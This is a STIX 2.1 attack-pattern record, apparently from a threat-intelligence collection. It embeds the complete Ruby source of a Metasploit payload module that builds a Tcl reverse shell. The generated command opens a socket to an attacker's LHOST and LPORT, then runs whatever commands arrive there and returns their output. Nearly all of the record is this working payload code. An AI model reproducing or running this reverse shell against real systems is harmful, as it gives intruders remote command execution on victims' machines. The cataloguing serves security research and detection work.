{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb51b36f-067a-49d8-a620-5dcb49126af0",
    "created": "2024-08-14T16:33:19.312052Z",
    "modified": "2024-08-14T16:33:19.312056Z",
    "name": "Unix Command Shell, Reverse TCP (via Tclsh)",
    "description": "Creates an interactive shell via Tclsh",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_tclsh.rb",
            "external_id": "reverse_tclsh.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n  CachedSize = 184\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Unix Command Shell, Reverse TCP (via Tclsh)',\n        'Description' => 'Creates an interactive shell via Tclsh',\n        'Author' => ['bcoles'],\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Handler' => Msf::Handler::ReverseTcp,\n        'Session' => Msf::Sessions::CommandShell,\n        'PayloadType' => 'cmd',\n        'RequiredCmd' => 'tclsh',\n        'Payload' => {\n          'Offsets' => {},\n          'Payload' => ''\n        }\n      )\n    )\n    register_advanced_options(\n      [\n        OptString.new('TCLSHPath', [true, 'The path to the TCLSH executable', 'tclsh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    %(echo 'set s [socket #{datastore['LHOST']} #{datastore['LPORT']}];set c \"\";while {$c != \"exit\"} {flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} {puts $s $r};flush $s;};close $s;'|#{datastore['TCLSHPath']})\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}